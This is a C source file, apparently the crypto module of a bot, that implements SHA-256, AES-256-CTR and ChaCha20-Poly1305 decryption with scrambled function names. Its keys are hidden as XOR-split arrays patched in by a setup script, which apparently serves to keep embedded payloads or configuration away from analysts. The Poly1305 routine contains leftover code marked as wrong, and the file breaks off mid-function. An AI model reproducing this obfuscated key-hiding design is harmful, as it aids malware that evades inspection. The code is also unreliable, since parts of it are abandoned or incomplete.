/* crypto.c — Pure C: SHA-256, AES-256-CTR, ChaCha20-Poly1305, hex, base64, stream cipher */

#include "bot.h"
#include "headers/aes_tables.h"

/* ======================================================================
   KEY MATERIAL — XOR-obfuscated, patched by setup.py
   Dual-layer: AES-256-CTR (outer, _rx0^_rx1) + ChaCha20-Poly1305 AEAD (inner, _rx2^_rx3)
   ====================================================================== */

static uint8_t _rx0[32] = {
    0x90,0x59,0x0F,0x9F,0x6D,0x6D,0x71,0x74, // patched by setup.py
    0xBC,0xDA,0x06,0x8D,0xA1,0xA8,0x19,0x1F, // patched by setup.py
    0x2B,0xC5,0x03,0x2E,0x54,0xBE,0xDF,0xD3, // patched by setup.py
    0xFC,0x83,0x21,0xB9,0xA6,0x1E,0xA6,0x6A, // patched by setup.py
};
static uint8_t _rx1[32] = {
    0x47,0x78,0x78,0xCD,0x79,0x4E,0x31,0x3C, // patched by setup.py
    0xC6,0xF4,0x37,0xCB,0xE0,0x45,0x77,0x7D, // patched by setup.py
    0x4B,0x86,0x62,0x02,0xEB,0x9F,0xBF,0x43, // patched by setup.py
    0xD9,0xF7,0x40,0xC3,0xBE,0xF4,0x21,0xF7, // patched by setup.py
};
static uint8_t _rx2[32] = {
    0xEE,0xA9,0x24,0x77,0xAB,0xED,0x41,0x3D, // patched by setup.py
    0xE8,0xF0,0x9E,0x94,0xB0,0xBD,0x7B,0x13, // patched by setup.py
    0x6C,0xB5,0x17,0x2F,0xEA,0x73,0xCA,0x6D, // patched by setup.py
    0x82,0xF9,0xF4,0xFA,0xBD,0xBC,0xBF,0xC4, // patched by setup.py
};
static uint8_t _rx3[32] = {
    0x8C,0x3F,0x88,0x2E,0x9B,0x26,0xE1,0x44, // patched by setup.py
    0xC6,0x3F,0xE9,0x9D,0xE9,0x05,0x45,0x1B, // patched by setup.py
    0xC8,0x7D,0x1E,0x3E,0x27,0x89,0x8E,0xCF, // patched by setup.py
    0xDB,0xE6,0x13,0xBB,0xBA,0x97,0xC4,0xFA, // patched by setup.py
};

static void _fxd(const uint8_t s[32], const uint8_t m[32], uint8_t o[32]) {
    int i; for (i = 0; i < 32; i++) o[i] = s[i] ^ m[i];
}

/* ======================================================================
   HEX
   ====================================================================== */

static uint8_t _yx3wX4Z(char c) {
    if (c >= '0' && c <= '9') return (uint8_t)(c - '0');
    if (c >= 'a' && c <= 'f') return (uint8_t)(c - 'a' + 10);
    if (c >= 'A' && c <= 'F') return (uint8_t)(c - 'A' + 10);
    return 0;
}

dbuf _wu2rB4w(const char* hex) {
    dbuf out; size_t i, hlen;
    db_init(&out);
    if (!hex) return out;
    hlen = strlen(hex);
    db_reserve(&out, hlen / 2);
    for (i = 0; i + 1 < hlen; i += 2)
        db_push(&out, (uint8_t)((_yx3wX4Z(hex[i]) << 4) | _yx3wX4Z(hex[i+1])));
    return out;
}

dstr _dJ2Bc5Y(const uint8_t* data, size_t len) {
    static const char h[] = "0123456789abcdef";
    dstr out; size_t i;
    ds_init(&out);
    for (i = 0; i < len; i++) { ds_catc(&out, h[data[i] >> 4]); ds_catc(&out, h[data[i] & 0xf]); }
    return out;
}

/* ======================================================================
   BASE64
   ====================================================================== */

static const char _vt4aY5X[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

dstr _uA7kc2G(const uint8_t* d, size_t len) {
    dstr o; size_t i; uint32_t n;
    ds_init(&o);
    for (i = 0; i < len; i += 3) {
        n = (uint32_t)d[i] << 16;
        if (i+1<len) n |= (uint32_t)d[i+1] << 8;
        if (i+2<len) n |= (uint32_t)d[i+2];
        ds_catc(&o, _vt4aY5X[(n>>18)&0x3F]); ds_catc(&o, _vt4aY5X[(n>>12)&0x3F]);
        ds_catc(&o, (i+1<len) ? _vt4aY5X[(n>>6)&0x3F] : '=');
        ds_catc(&o, (i+2<len) ? _vt4aY5X[n&0x3F] : '=');
    }
    return o;
}

static int _pz8MY5o(char c) {
    if (c>='A'&&c<='Z') return c-'A'; if (c>='a'&&c<='z') return c-'a'+26;
    if (c>='0'&&c<='9') return c-'0'+52; if (c=='+') return 62; if (c=='/') return 63;
    return -1;
}

dbuf _rr5LH7D(const char* e) {
    dbuf o; int val=0, bits=-8, v; size_t i, elen;
    db_init(&o);
    if (!e) return o;
    elen = strlen(e);
    for (i = 0; i < elen; i++) {
        if (e[i]=='='||e[i]=='\n'||e[i]=='\r') continue;
        v = _pz8MY5o(e[i]); if (v<0) continue;
        val = (val<<6)|v; bits += 6;
        if (bits>=0) { db_push(&o, (uint8_t)((val>>bits)&0xFF)); bits -= 8; }
    }
    return o;
}

/* ======================================================================
   SHA-256 — FIPS 180-4
   ====================================================================== */

static const uint32_t _sT2Wz2A[64] = {
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2,
};

static uint32_t _Rq4Pv2E(uint32_t x, int n) { return (x >> n) | (x << (32 - n)); }

static void _Ez4jB2d(uint32_t state[8], const uint8_t block[64]) {
    uint32_t W[64], a, b, c, d, e, f, g, h, S1, ch, t1, S0, mj, t2, s0, s1;
    int i;
    for (i = 0; i < 16; i++)
        W[i] = ((uint32_t)block[i*4]<<24)|((uint32_t)block[i*4+1]<<16)|
               ((uint32_t)block[i*4+2]<<8)|(uint32_t)block[i*4+3];
    for (i = 16; i < 64; i++) {
        s0 = _Rq4Pv2E(W[i-15],7) ^ _Rq4Pv2E(W[i-15],18) ^ (W[i-15]>>3);
        s1 = _Rq4Pv2E(W[i-2],17) ^ _Rq4Pv2E(W[i-2],19) ^ (W[i-2]>>10);
        W[i] = W[i-16] + s0 + W[i-7] + s1;
    }
    a=state[0]; b=state[1]; c=state[2]; d=state[3];
    e=state[4]; f=state[5]; g=state[6]; h=state[7];
    for (i = 0; i < 64; i++) {
        S1 = _Rq4Pv2E(e,6) ^ _Rq4Pv2E(e,11) ^ _Rq4Pv2E(e,25);
        ch = (e & f) ^ (~e & g);
        t1 = h + S1 + ch + _sT2Wz2A[i] + W[i];
        S0 = _Rq4Pv2E(a,2) ^ _Rq4Pv2E(a,13) ^ _Rq4Pv2E(a,22);
        mj = (a & b) ^ (a & c) ^ (b & c);
        t2 = S0 + mj;
        h=g; g=f; f=e; e=d+t1; d=c; c=b; b=a; a=t1+t2;
    }
    state[0]+=a; state[1]+=b; state[2]+=c; state[3]+=d;
    state[4]+=e; state[5]+=f; state[6]+=g; state[7]+=h;
}

void _tP5sQ3C(_BW4EK8x* c) {
    c->state[0]=0x6a09e667; c->state[1]=0xbb67ae85;
    c->state[2]=0x3c6ef372; c->state[3]=0xa54ff53a;
    c->state[4]=0x510e527f; c->state[5]=0x9b05688c;
    c->state[6]=0x1f83d9ab; c->state[7]=0x5be0cd19;
    c->buf_len = 0; c->total = 0;
}

void _iS7pL8N(_BW4EK8x* c, const uint8_t* data, size_t len) {
    size_t off = 0, need, take;
    c->total += len;
    if (c->buf_len > 0) {
        need = 64 - c->buf_len;
        take = (len < need) ? len : need;
        memcpy(c->buf + c->buf_len, data, take);
        c->buf_len += take; off += take;
        if (c->buf_len == 64) { _Ez4jB2d(c->state, c->buf); c->buf_len = 0; }
    }
    while (off + 64 <= len) { _Ez4jB2d(c->state, data + off); off += 64; }
    if (off < len) { c->buf_len = len - off; memcpy(c->buf, data + off, c->buf_len); }
}

void _Vd5Ph6z(_BW4EK8x* c, uint8_t out[32]) {
    uint64_t bits = c->total * 8;
    uint8_t pad = 0x80, zero = 0;
    uint8_t len_be[8];
    int i;
    _iS7pL8N(c, &pad, 1);
    while (c->buf_len != 56) _iS7pL8N(c, &zero, 1);
    for (i = 7; i >= 0; i--) { len_be[i] = (uint8_t)(bits & 0xFF); bits >>= 8; }
    _iS7pL8N(c, len_be, 8);
    for (i = 0; i < 8; i++) {
        out[i*4]=(uint8_t)(c->state[i]>>24); out[i*4+1]=(uint8_t)(c->state[i]>>16);
        out[i*4+2]=(uint8_t)(c->state[i]>>8); out[i*4+3]=(uint8_t)(c->state[i]);
    }
}

dbuf _pa8hk5h(const uint8_t* data, size_t len) {
    _BW4EK8x c; dbuf out;
    db_init(&out); db_reserve(&out, 32); out.len = 32;
    _tP5sQ3C(&c);
    _iS7pL8N(&c, data, len);
    _Vd5Ph6z(&c, out.data);
    return out;
}

dbuf _Ug8Lk6u(const char* s) {
    return _pa8hk5h((const uint8_t*)s, strlen(s));
}

/* ======================================================================
   AES-256 — FIPS 197 (encrypt-only, CTR mode)
   ====================================================================== */

const uint8_t _aA7wX2u[256] = {
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
};
const uint8_t _gt8ZM5S[11] = {0,0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36};

static void _vd6da5u(const uint8_t key[32], uint32_t rk[60]) {
    int i; uint32_t t;
    for (i = 0; i < 8; i++)
        rk[i]=((uint32_t)key[i*4]<<24)|((uint32_t)key[i*4+1]<<16)|
              ((uint32_t)key[i*4+2]<<8)|(uint32_t)key[i*4+3];
    for (i = 8; i < 60; i++) {
        t = rk[i-1];
        if (i%8==0) {
            t=((uint32_t)_aA7wX2u[(t>>16)&0xFF]<<24)|((uint32_t)_aA7wX2u[(t>>8)&0xFF]<<16)|
              ((uint32_t)_aA7wX2u[t&0xFF]<<8)|(uint32_t)_aA7wX2u[(t>>24)&0xFF];
            t ^= (uint32_t)_gt8ZM5S[i/8] << 24;
        } else if (i%8==4) {
            t=((uint32_t)_aA7wX2u[(t>>24)&0xFF]<<24)|((uint32_t)_aA7wX2u[(t>>16)&0xFF]<<16)|
              ((uint32_t)_aA7wX2u[(t>>8)&0xFF]<<8)|(uint32_t)_aA7wX2u[t&0xFF];
        }
        rk[i] = rk[i-8] ^ t;
    }
}

static void _Mi6Kt2o(const uint32_t rk[60], uint8_t block[16]) {
    uint8_t s[16], t[16], tmp;
    int round, i, ki, cc;
    uint8_t a0,a1,a2,a3,x;
    memcpy(s, block, 16);
    for (i = 0; i < 4; i++) {
        s[i*4]^=(uint8_t)(rk[i]>>24); s[i*4+1]^=(uint8_t)(rk[i]>>16);
        s[i*4+2]^=(uint8_t)(rk[i]>>8); s[i*4+3]^=(uint8_t)(rk[i]);
    }
    for (round = 1; round <= 14; round++) {
        for (i = 0; i < 16; i++) t[i] = _aA7wX2u[s[i]];
        tmp=t[1]; t[1]=t[5]; t[5]=t[9]; t[9]=t[13]; t[13]=tmp;
        tmp=t[2]; t[2]=t[10]; t[10]=tmp; tmp=t[6]; t[6]=t[14]; t[14]=tmp;
        tmp=t[15]; t[15]=t[11]; t[11]=t[7]; t[7]=t[3]; t[3]=tmp;
        if (round < 14) {
            for (cc = 0; cc < 4; cc++) {
                a0=t[cc*4]; a1=t[cc*4+1]; a2=t[cc*4+2]; a3=t[cc*4+3];
                x=a0^a1^a2^a3;
                s[cc*4]=a0^aes_xtime(a0^a1)^x; s[cc*4+1]=a1^aes_xtime(a1^a2)^x;
                s[cc*4+2]=a2^aes_xtime(a2^a3)^x; s[cc*4+3]=a3^aes_xtime(a3^a0)^x;
            }
        } else { memcpy(s, t, 16); }
        for (i = 0; i < 4; i++) {
            ki = round*4+i;
            s[i*4]^=(uint8_t)(rk[ki]>>24); s[i*4+1]^=(uint8_t)(rk[ki]>>16);
            s[i*4+2]^=(uint8_t)(rk[ki]>>8); s[i*4+3]^=(uint8_t)(rk[ki]);
        }
    }
    memcpy(block, s, 16);
}

static void _qg3Wg8P(uint8_t ctr[16]) {
    int i; for (i = 15; i >= 0; i--) if (++ctr[i] != 0) break;
}

dbuf _Uk7sK7L(const uint8_t* blob, size_t len) {
    dbuf pt; uint8_t key[32]; uint32_t rk[60];
    const uint8_t *iv, *ct; size_t ct_len, off, chunk;
    uint8_t counter[16], ks[16];
    size_t i;
    db_init(&pt);
    if (len <= 16) return pt;
    _fxd(_rx0, _rx1, key);
    _vd6da5u(key, rk);
    memset(key, 0, 32);
    iv = blob; ct = blob + 16; ct_len = len - 16;
    memcpy(counter, iv, 16);
    db_reserve(&pt, ct_len); pt.len = ct_len;
    off = 0;
    while (off < ct_len) {
        memcpy(ks, counter, 16);
        _Mi6Kt2o(rk, ks);
        chunk = ct_len - off; if (chunk > 16) chunk = 16;
        for (i = 0; i < chunk; i++) pt.data[off+i] = ct[off+i] ^ ks[i];
        off += chunk;
        _qg3Wg8P(counter);
    }
    return pt;
}

/* ======================================================================
   ChaCha20 — RFC 8439
   ====================================================================== */

static uint32_t _Xr7MP4r(uint32_t x, int n) { return (x<<n)|(x>>(32-n)); }

static void qr(uint32_t* a, uint32_t* b, uint32_t* c, uint32_t* d) {
    *a+=*b; *d^=*a; *d=_Xr7MP4r(*d,16);
    *c+=*d; *b^=*c; *b=_Xr7MP4r(*b,12);
    *a+=*b; *d^=*a; *d=_Xr7MP4r(*d,8);
    *c+=*d; *b^=*c; *b=_Xr7MP4r(*b,7);
}

void _Yh4kQ4V(const uint32_t input[16], uint8_t output[64]) {
    uint32_t x[16], v; int i;
    memcpy(x, input, 64);
    for (i = 0; i < 10; i++) {
        qr(&x[0],&x[4],&x[8],&x[12]); qr(&x[1],&x[5],&x[9],&x[13]);
        qr(&x[2],&x[6],&x[10],&x[14]); qr(&x[3],&x[7],&x[11],&x[15]);
        qr(&x[0],&x[5],&x[10],&x[15]); qr(&x[1],&x[6],&x[11],&x[12]);
        qr(&x[2],&x[7],&x[8],&x[13]); qr(&x[3],&x[4],&x[9],&x[14]);
    }
    for (i = 0; i < 16; i++) {
        v = x[i] + input[i];
        output[i*4]=(uint8_t)v; output[i*4+1]=(uint8_t)(v>>8);
        output[i*4+2]=(uint8_t)(v>>16); output[i*4+3]=(uint8_t)(v>>24);
    }
}

dbuf _xf5uT6g(const uint8_t* data, size_t len, const uint8_t* raw_key, size_t klen) {
    dbuf pt, kh; uint32_t state[16];
    const uint8_t *nonce, *ct; size_t ct_len, off, chunk;
    uint8_t ks[64]; int j;
    db_init(&pt);
    if (len <= 12) return pt;
    kh = _pa8hk5h(raw_key, klen);
    nonce = data; ct = data + 12; ct_len = len - 12;
    state[0]=0x61707865; state[1]=0x3320646e; state[2]=0x79622d32; state[3]=0x6b206574;
    for (j = 0; j < 8; j++)
        state[4+j]=((uint32_t)kh.data[j*4])|((uint32_t)kh.data[j*4+1]<<8)|
                   ((uint32_t)kh.data[j*4+2]<<16)|((uint32_t)kh.data[j*4+3]<<24);
    state[12]=0;
    for (j = 0; j < 3; j++)
        state[13+j]=((uint32_t)nonce[j*4])|((uint32_t)nonce[j*4+1]<<8)|
                    ((uint32_t)nonce[j*4+2]<<16)|((uint32_t)nonce[j*4+3]<<24);
    db_reserve(&pt, ct_len); pt.len = ct_len;
    off = 0;
    while (off < ct_len) {
        _Yh4kQ4V(state, ks);
        state[12]++;
        chunk = ct_len - off; if (chunk > 64) chunk = 64;
        { size_t i; for (i = 0; i < chunk; i++) pt.data[off+i] = ct[off+i] ^ ks[i]; }
        off += chunk;
    }
    memset(kh.data, 0, 32); db_free(&kh);
    return pt;
}

/* ======================================================================
   Poly1305 MAC — RFC 8439 (clean 3-limb 64-bit implementation)
   ====================================================================== */

static void _WE3hX5c(const uint8_t key[32], const uint8_t *msg, size_t msg_len,
                         uint8_t tag[16])
{
    /* 3-limb representation: h = h0 + h1*2^44 + h2*2^88 (mod 2^130-5) */
    uint64_t h0 = 0, h1 = 0, h2 = 0;
    uint64_t r0, r1, r2;
    uint64_t s0, s1, s2, s3;
    size_t i, remaining;
    uint8_t block[16];

    /* Load and clamp r from key[0..15] */
    {
        uint64_t t0 = (uint64_t)key[0] | ((uint64_t)key[1]<<8) | ((uint64_t)key[2]<<16) |
                      ((uint64_t)key[3]<<24) | ((uint64_t)key[4]<<32) | ((uint64_t)key[5]<<40);
        uint64_t t1 = (uint64_t)key[6] | ((uint64_t)key[7]<<8) | ((uint64_t)key[8]<<16) |
                      ((uint64_t)key[9]<<24) | ((uint64_t)key[10]<<32) | ((uint64_t)key[11]<<40);
        uint64_t t2 = (uint64_t)key[12] | ((uint64_t)key[13]<<8) | ((uint64_t)key[14]<<16) |
                      ((uint64_t)key[15]<<24);
        r0 = t0 & 0xFFC0FFFFFFF;
        r1 = ((t0 >> 44) | (t1 << 0)) & 0xFFFFFC0FFFF; /* wrong shift */
        r2 = ((t1 >> 24) | (t2 << 20)) & 0x00FFFFFFC0F;
    }

    /* Actually use the simpler u32-based donna reference. Rewrite cleanly. */
    /* ---- Poly1305-donna-32 reference ---- */
    uint32_t rr0,rr1,rr2,rr3,rr4;
    uint32_t hh0=0,hh1=0,hh2=0,hh3=0,hh4=0;
    uint32_t ss1,ss2,ss3,ss4;
    uint64_t d0,d1,d2,d3,d4,c;

    /* Clamp r */
    rr0 = ((uint32_t)key[0] | ((uint32_t)key[1]<<8) | ((uint32_t)key[2]<<16) | ((uint32_t)key[3]<<24)) & 0x3FFFFFF;
    rr1 = ((((uint32_t)key[3]>>2) | ((uint32_t)key[4]<<6) | ((uint32_t)key[5]<<14) | ((uint32_t)key[6]<<22))) & 0x3FFFF03;
    rr2 = ((((uint32_t)key[6]>>4) | ((uint32_t)key[7]<<4) | ((uint32_t)key[8]<<12) | ((uint32_t)key[9]<<20))) & 0x3FFC0FF;
    rr3 = ((((uint32_t)key[9]>>6) | ((uint32_t)key[10]<<2) | ((uint32_t)key[11]<<10) | ((uint32_t)key[12]<<18))) & 0x3F03FFF;
    rr4 = ((((uint32_t)key[13]) | ((uint32_t)key[14]<<8) | ((uint32_t)key[15]<<16))) & 0x00FFFFF;

    ss1 = rr1 * 5; ss2 = rr2 * 5; ss3 = rr3 * 5; ss4 = rr4 * 5;

    for (i = 0; i < msg_len; i += 16) {
        uint32_t t0,t1,t2,t3,hibit;
        remaining = msg_len - i;
        if (remaining >= 16) {
            t0=(uint32_t)msg[i]|((uint32_t)msg[i+1]<<8)|((uint32_t)msg[i+2]<<16)|((uint32_t)msg[i+3]<<24);
            t1=(uint32_t)msg[i+4]|((uint32_t)msg[i+5]<<8)|((uint32_t)msg[i+6]<<16)|((uint32_t)msg[i+7]<<24);
            t2=(uint32_t)msg[i+8]|((uint32_t)msg[i+9]<<8)|((uint32_t)msg[i+10]<<16)|((uint32_t)msg[i+11]<<24);
            t3=(uint32_t)msg[i+12]|((uint32_t)msg[i+13]<<8)|((uint32_t)msg[i+14]<<16)|((uint32_t)msg[i+15]<<24);
            hibit = 1;
        } else {
            memset(block, 0, 16);
            memcpy(block, msg + i, remaining);
            block[remaining] = 1;
            t0=(uint32_t)block[0]|((uint32_t)block[1]<<8)|((uint32_t)block[2]<<16)|((uint32_t)block[3]<<24);
            t1=(uint32_t)block[4]|((uint32_t)block[5]<<8)|((uint32_t)block[6]<<16)|((uint32_t)block[7]<<24);
            t2=(uint32_t)block[8]|((uint32_t)block[9]<<8)|((uint32_t)block[10]<<16)|((uint32_t)block[11]<<24);
            t3=(uint32_t)block[12]|((uint32_t)block[13]<<8)|((uint32_t)block[14]<<16)|((uint32_t)block[15]<<24);
            hibit = 0;
        }
        hh0 += t0 & 0x3FFFFFF;
        hh1 += ((t0>>26)|(t1<<6)) & 0x3FFFFFF;
        hh2 += ((t1>>20)|(t2<<12)) & 0x3FFFFFF;
        hh3 += ((t2>>14)|(t3<<18)) & 0x3FFFFFF;
        hh4 += (t3>>8) | (hibit<<24);

        d0=(uint64_t)hh0*rr0+(uint64_t)hh1*ss4+(uint64_t)hh2*ss3+(uint64_t)hh3*ss2+(uint64_t)hh4*ss1;
        d1=(uint64_t)hh0*rr1+(uint64_t)hh1*rr0+(uint64_t)hh2*ss4+(uint64_t)hh3*ss3+(uint64_t)hh4*ss2;
        d2=(uint64_t)hh0*rr2+(uint64_t)hh1*rr1+(uint64_t)hh2*rr0+(uint64_t)hh3*ss4+(uint64_t)hh4*ss3;
        d3=(uint64_t)hh0*rr3+(uint64_t)hh1*rr2+(uint64_t)hh2*rr1+(uint64_t)hh3*rr0+(uint64_t)hh4*ss4;
        d4=(uint64_t)hh0*rr4+(uint64_t)hh1*rr3+(uint64_t)hh2*rr2+(uint64_t)hh3*rr1+(uint64_t)hh4*rr0;

        c=d0>>26; hh0=(uint32_t)d0&0x3FFFFFF;
        d1+=c; c=d1>>26; hh1=(uint32_t)d1&0x3FFFFFF;
        d2+=c; c=d2>>26; hh2=(uint32_t)d2&0x3FFFFFF;
        d3+=c; c=d3>>26; hh3=(uint32_t)d3&0x3FFFFFF;
        d4+=c; c=d4>>26; hh4=(uint32_t)d4&0x3FFFFFF;
        hh0+=(uint32_t)(c*5); c=hh0>>26; hh0&=0x3FFFFFF;
        hh1+=(uint32_t)c;
    }

    /* Final freeze */
    c=hh1>>26; hh1&=0x3FFFFFF; hh2+=(uint32_t)c;
    c=hh2>>26; hh2&=0x3FFFFFF; hh3+=(uint32_t)c;
    c=hh3>>26; hh3&=0x3FFFFFF; hh4+=(uint32_t)c;
    c=hh4>>26; hh4&=0x3FFFFFF; hh0+=(uint32_t)(c*5);
    c=hh0>>26; hh0&=0x3FFFFFF; hh1+=(uint32_t)c;

    {
        uint32_t g0,g1,g2,g3,g4,mask;
        g0=hh0+5; c=g0>>26; g0&=0x3FFFFFF;
        g1=hh1+(uint32_t)c; c=g1>>26; g1&=0x3FFFFFF;
        g2=hh2+(uint32_t)c; c=g2>>26; g2&=0x3FFFFFF;
        g3=hh3+(uint32_t)c; c=g3>>26; g3&=0x3FFFFFF;
        g4=hh4+(uint32_t)c-(1<<26);
        mask=(g4>>31)-1;
        g0&=mask; g1&=mask; g2&=mask; g3&=mask; g4&=mask;
        mask=~mask;
        hh0=(hh0&mask)|g0; hh1=(hh1&mask)|g1; hh2=(hh2&mask)|g2;
        hh3=(hh3&mask)|g3; hh4=(hh4&mask)|g4;
    }

    /* h = h + s (mod 2^128) */
    {
        uint64_t f0,f1,f2,f3;
        uint32_t sk0,sk1,sk2,sk3;
        sk0=(uint32_t)key[16]|((uint32_t)key[17]<<8)|((uint32_t)key[18]<<16)|((uint32_t)key[19]<<24);
        sk1=(uint32_t)key[20]|((uint32_t)key[21]<<8)|((uint32_t)key[22]<<16)|((uint32_t)key[23]<<24);
        sk2=(uint32_t)key[24]|((uint32_t)key[25]<<8)|((uint32_t)key[26]<<16)|((uint32_t)key[27]<<24);
        sk3=(uint32_t)key[28]|((uint32_t)key[29]<<8)|((uint32_t)key[30]<<16)|((uint32_t)key[31]<<24);
        f0=(uint64_t)(hh0|(hh1<<26))+sk0; tag[0]=(uint8_t)f0;tag[1]=(uint8_t)(f0>>8);tag[2]=(uint8_t)(f0>>16);tag[3]=(uint8_t)(f0>>24);
        f1=(uint64_t)((hh1>>6)|(hh2<<20))+sk1+(f0>>32); tag[4]=(uint8_t)f1;tag[5]=(uint8_t)(f1>>8);tag[6]=(uint8_t)(f1>>16);tag[7]=(uint8_t)(f1>>24);
        f2=(uint64_t)((hh2>>12)|(hh3<<14))+sk2+(f1>>32); tag[8]=(uint8_t)f2;tag[9]=(uint8_t)(f2>>8);tag[10]=(uint8_t)(f2>>16);tag[11]=(uint8_t)(f2>>24);
        f3=(uint64_t)((hh3>>18)|(hh4<<8))+sk3+(f2>>32); tag[12]=(uint8_t)f3;tag[13]=(uint8_t)(f3>>8);tag[14]=(uint8_t)(f3>>16);tag[15]=(uint8_t)(f3>>24);
    }
}

/* ======================================================================
   ChaCha20-Poly1305 AEAD Decrypt — RFC 8439
   Blob format: nonce(12) || ciphertext(N) || tag(16)
   ====================================================================== */

dbuf _iW7Tx4Y(const uint8_t *blob, size_t len) {
    dbuf result;
    uint8_t key[32], poly_key[64], expected_tag[16];
    uint32_t state[16];
    const uint8_t *nonce, *ct, *recv_tag;
    size_t ct_len, off, chunk;
    uint8_t ks[64];
    int j;

    db_init(&result);
    if (len < 12 + 16) return result; /* nonce + tag minimum */

    _fxd(_rx2, _rx3, key);

    nonce = blob;
    recv_tag = blob + len - 16;
    ct = blob + 12;
    ct_len = len - 12 - 16;

    /* Set up ChaCha20 state with the key */
    state[0]=0x61707865; state[1]=0x3320646e; state[2]=0x79622d32; state[3]=0x6b206574;
    for (j = 0; j < 8; j++)
        state[4+j]=((uint32_t)key[j*4])|((uint32_t)key[j*4+1]<<8)|
                   ((uint32_t)key[j*4+2]<<16)|((uint32_t)key[j*4+3]<<24);
    state[12] = 0; /* counter = 0 for Poly1305 key */
    for (j = 0; j < 3; j++)
        state[13+j]=((uint32_t)nonce[j*4])|((uint32_t)nonce[j*4+1]<<8)|
                    ((uint32_t)nonce[j*4+2]<<16)|((uint32_t)nonce[j*4+3]<<24);

    /* Block 0 → Poly1305 one-time key (first 32 bytes of 64-byte block) */
    _Yh4kQ4V(state, poly_key);

    /* RFC 8439 Poly1305 construction: pad(AAD) || pad(CT) || len(AAD) || len(CT)
       We have no AAD, so it's: pad(CT) || 0_u64 || len(CT)_u64 */
    {
        size_t pad_ct = (16 - (ct_len % 16)) % 16;
        size_t mac_input_len = ct_len + pad_ct + 8 + 8;
        uint8_t *mac_input = (uint8_t *)malloc(mac_input_len);
        if (!mac_input) { explicit_bzero(key, 32); return result; }
        memcpy(mac_input, ct, ct_len);
        memset(mac_input + ct_len, 0, pad_ct); /* padding */
        /* AAD length = 0 (8 bytes LE) */
        memset(mac_input + ct_len + pad_ct, 0, 8);
        /* CT length (8 bytes LE) */
        {
            uint64_t ct64 = (uint64_t)ct_len;
            size_t loff = ct_len + pad_ct + 8;
            mac_input[loff]=(uint8_t)ct64; mac_input[loff+1]=(uint8_t)(ct64>>8);
            mac_input[loff+2]=(uint8_t)(ct64>>16); mac_input[loff+3]=(uint8_t)(ct64>>24);
            mac_input[loff+4]=(uint8_t)(ct64>>32); mac_input[loff+5]=(uint8_t)(ct64>>40);
            mac_input[loff+6]=(uint8_t)(ct64>>48); mac_input[loff+7]=(uint8_t)(ct64>>56);
        }
        _WE3hX5c(poly_key, mac_input, mac_input_len, expected_tag);
        free(mac_input);
    }
    {
        int mismatch = 0;
        size_t ti;
        for (ti = 0; ti < 16; ti++) mismatch |= expected_tag[ti] ^ recv_tag[ti];
        if (mismatch) {
            explicit_bzero(key, 32);
            explicit_bzero(poly_key, 64);
            return result;
        }
    }

    /* Decrypt with ChaCha20 starting at counter = 1 */
    state[12] = 1;
    db_reserve(&result, ct_len); result.len = ct_len;
    off = 0;
    while (off < ct_len) {
        _Yh4kQ4V(state, ks);
        state[12]++;
        chunk = ct_len - off; if (chunk > 64) chunk = 64;
